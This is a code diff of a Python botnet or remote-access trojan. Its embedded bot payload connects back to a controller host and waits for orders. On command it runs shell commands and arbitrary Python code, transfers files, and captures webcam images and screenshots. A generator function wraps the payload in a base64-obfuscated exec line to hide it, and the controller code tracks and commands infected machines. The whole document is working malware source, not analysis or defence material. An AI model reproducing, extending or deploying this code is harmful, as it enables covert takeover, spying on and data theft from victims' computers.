@@ -1,21 +1,28 @@
 # github.com/ycy20090311
-# 2022.11.29
+# 2022.12.28
 
+# Python Library
+import time
+import socket
 import base64
-import time,socket
 
-BotNet = {}
+# Bots Dictionaries
+# BotSocket:SystemInfo
+Bots = {}
 
+# BotCode StringVariable
 BotCode = """
+import os
+import cv2
+import time
+import socket
 import platform
 import subprocess
-import time,socket
-import os,cv2,pyscreenshot
-
+import pyscreenshot
 try:
     BotSocket = socket.socket()
     BotSocket.connect(("{0}",{1}))
-    SendMsg = b"system %b %b %b" % (os.name.encode(),platform.node().encode(),platform.machine().encode())
+    SendMsg = b"systeminfo %b %b %b" % (platform.platform().encode(),platform.node().encode(),platform.machine().encode())
     BotSocket.sendall(SendMsg)
     while True:
         RecvMsg = BotSocket.recv(20)
@@ -28,7 +35,6 @@ try:
                 if RecvMsg.split()[0] == b"shell":
                     shell = subprocess.Popen(RecvMsg.split(b" ",1)[1],shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
                     SendMsg = b"shell %b" % shell.stdout.read() + shell.stderr.read()
-                    if SendMsg == b"shell ":SendMsg = b"shell ok"
                 elif RecvMsg.split()[0] == b"pycode":
                     exec(RecvMsg.split(b" ",1)[1])
                     SendMsg = b"pycode ok"
@@ -44,10 +50,8 @@ try:
                 elif RecvMsg.split()[0] == b"webcamsnap":
                     WebCamsnap = cv2.VideoCapture(0)
                     Out,Image = WebCamsnap.read()
-                    if Out == True:
-                        SendMsg = b"webcamsnap %b %b" % (RecvMsg.split(b" ",2)[1],cv2.imencode(".jpg",Image)[1].tobytes())
-                    else:
-                        SendMsg = b"webcamsmap no"
+                    if Out == True:SendMsg = b"webcamsnap %b %b" % (RecvMsg.split(b" ",2)[1],cv2.imencode(".jpg",Image)[1].tobytes())
+                    else:SendMsg = b"webcamsmap no"
                 elif RecvMsg.split()[0] == b"screenshot":
                     Image = pyscreenshot.grab()
                     Image.save(".screenshot.jpg")
@@ -55,7 +59,7 @@ try:
                     SendMsg = b"screenshot %b %b" % (RecvMsg.split(b" ",2)[1],cv2.imencode(".jpg",Image)[1].tobytes())
                     os.remove(".screenshot.jpg")
                 else:
-                    SendMsg = b"no"
+                    SendMsg = b"command no"
             except:
                 SendMsg = b"%b no" % RecvMsg.split()[0]
             BotSocket.sendall(b"size %b" % str(len(SendMsg)).encode())
@@ -66,32 +70,46 @@ except:
     exit(0)         
 """
 
-def Generate(BotSrc,ControlIp,ControlPort):
+# Generate BotScript
+def Generate(FilePath,ControlIp,ControlPort):
     try:
-        BotFile = open(BotSrc,"w+")
-        BotFile.write("import base64;exec(base64.b64decode(%s))" % str(base64.b64encode(str(BotCode.format(ControlIp,ControlPort)).encode())))
-        BotFile.close()
-        return "ok"
+        File = open(FilePath,"w+")
+        File.write("import base64;exec(base64.b64decode(%s))" % str(base64.b64encode(str(BotCode.format(ControlIp,ControlPort)).encode())))
+        File.close()
+        return "generate ok"
     except:
-        return "no"
-    
-def Listen(ControlPort):
+        return "generate no"
+
+# Listen Port
+def Listen(ControlHost,ControlPort):
     ControlSocket = socket.socket()
-    ControlSocket.bind(("",int(ControlPort)))
+    ControlSocket.bind((ControlHost,int(ControlPort)))
     ControlSocket.listen()
     while True:
         BotSocket,BotAddr = ControlSocket.accept()
         RecvMsg = BotSocket.recv(1024)
-        if RecvMsg.split()[0] == b"system":
-            BotNet[BotSocket] = "%s %s" % (RecvMsg.split(b" ",1)[1].decode(),BotSocket.getpeername()[0])
+        if RecvMsg.split()[0] == b"systeminfo":
+            Bots[BotSocket] = "%s %s" % (RecvMsg.split(b" ",1)[1].decode(),BotSocket.getpeername()[0])
 
-def Run(BotSocket,Command):
+# Print Bots
+def ListBot():
+    BotList = ""
+    for BotID in range(len(Bots.keys())):
+        Run(BotID,"shell pwd")
+    BotSockets = list(Bots.keys())
+    for BotSocket in BotSockets:
+        BotList += "%s %s\n" % (BotSockets.index(BotSocket),Bots[BotSocket])
+    return BotList
+    
+# RunCommand For Bot
+def Run(BotID,Command):
     try:       
         SendMsg = Command.encode()
+        BotSocket = list(Bots.keys())[int(BotID)]
         if SendMsg.split()[0] == b"putfile":
             SendFile = open(SendMsg.split(b" ",2)[2],"rb+")
             SendMsg = b"putfile %b %b" % (SendMsg.split(b" ",2)[1],SendFile.read())
-            SendFile.close()
+            SendFile.close()       
         BotSocket.sendall(b"size %b" % str(len(SendMsg)).encode())
         time.sleep(0.3)
         BotSocket.sendall(SendMsg)
@@ -100,49 +118,34 @@ def Run(BotSocket,Command):
             RecvSize = int(RecvMsg.split(b" ",1)[1])
             RecvMsg = b""
             while len(RecvMsg) < RecvSize:
-                RecvMsg += BotSocket.recv(1024)
-            if RecvMsg.split()[0] == b"shell":
-                if RecvMsg.split(b" ",1)[1] != b"no":
-                    return("\033[32m[INFO] Run Shell For %s \033[0m \n%s" % (BotSocket.getpeername()[0],RecvMsg.split(b" ",1)[1].decode()))
-                else:
-                    return("\033[31m[ERROR] Run Shell For %s \033[0m \nCommand execution failed" % BotSocket.getpeername()[0])
-            elif RecvMsg.split()[0] == b"pycode":
-                if RecvMsg.split(b" ",1)[1] != b"no":
-                    return("\033[32m[INFO] Run PythonCode For %s \033[0m \nPythonCode execution succeeded" % BotSocket.getpeername()[0])
-                else:
-                    return("\033[31m[ERROR] Run PythonCode for %s \033[0m \nThe PythonCode execution failed" % BotSocket.getpeername()[0])
+                RecvMsg += BotSocket.recv(1024)          
+            if RecvMsg.split()[0] in [b"shell",b"pycode",b"putfile"]:
+                return RecvMsg.decode()
             elif RecvMsg.split()[0] == b"getfile":
-                if RecvMsg.split(b" ",1)[1] != b"no":
+                if RecvMsg.split()[1] == b"no":
+                    return "getfile no"
+                else:
                     RecvFile = open(RecvMsg.split(b" ",2)[1],"wb+")
                     RecvFile.write(RecvMsg.split(b" ",2)[2])
                     RecvFile.close()
-                    return("\033[32m[INFO] Getfile For %s \033[0m\nThe file was downloaded successfully to %s" % (BotSocket.getpeername()[0],RecvMsg.split(b" ",2)[1].decode()))
-                else:
-                    return("\033[31m[ERROR] Getfile For %s \033[0m \nThe file download failed" % BotSocket.getpeername()[0])
-            elif RecvMsg.split()[0] == b"putfile":
-                if RecvMsg.split(b" ",1)[1] != b"no":
-                    return("\033[32m[INFO] Putfile For %s \033[0m\nThe file is uploaded successfully" % BotSocket.getpeername()[0])
-                else:
-                    return("\033[31m[ERROR] Putfile For %s \033[0m \nFile upload failed" % BotSocket.getpeername()[0])
-            elif RecvMsg.split()[0] == b"webcamsnap":
-                if RecvMsg.split(b" ",1)[1] != b"no":
-                    RecvFile = open(RecvMsg.split(b" ",2)[1],"wb+")
-                    RecvFile.write(RecvMsg.split(b" ",2)[2])
-                    RecvFile.close()
-                    return("\033[32m[INFO] WebCamsnap For %s \033[0m \nWebCamsnap was downloaded successfully to %s" % (BotSocket.getpeername()[0],RecvMsg.split(b" ",2)[1].decode()))
-                else:
-                    return("\033[31m[ERROR] WebCamsnap For %s \033[0m \nCamera acquisition failed" % BotSocket.getpeername()[0])
+                    return "getfile ok"
             elif RecvMsg.split()[0] == b"screenshot":
-                if RecvMsg.split(b" ",1)[1] != b"no":
+                if RecvMsg.split()[1] == b"no":
+                    return "screenshot no"
+                else:
                     RecvFile = open(RecvMsg.split(b" ",2)[1],"wb+")
                     RecvFile.write(RecvMsg.split(b" ",2)[2])
                     RecvFile.close()
-                    return("\033[32m[INFO] ScreenShot For %s \033[0m \nScreenShot was downloaded successfully to %s" % (BotSocket.getpeername()[0],RecvMsg.split(b" ",2)[1].decode()))
+                    return "screenshot ok"
+            elif RecvMsg.split()[0] == b"webcamsnap":
+                if RecvMsg.split()[1] == b"no":
+                    return "webcamsnap no"
                 else:
-                    return("\033[31m[ERROR] ScreenShot For %s \033[0m \nScreenShot acquisition failed" % BotSocket.getpeername()[0])
-            elif RecvMsg.split()[0] == b"no":
-                return("\033[31m[ERROR] There is no such command\033[0m")
+                    RecvFile = open(RecvMsg.split(b" ",2)[1],"wb+")
+                    RecvFile.write(RecvMsg.split(b" ",2)[2])
+                    RecvFile.close()
+                    return "webcamsnap ok"
     except:
-        del BotNet[BotSocket]
+        del Bots[BotSocket]
         BotSocket.close()
-        return("\033[31m[ERROR] The session has been interrupted\033[0m")
+        return "botsocket no"
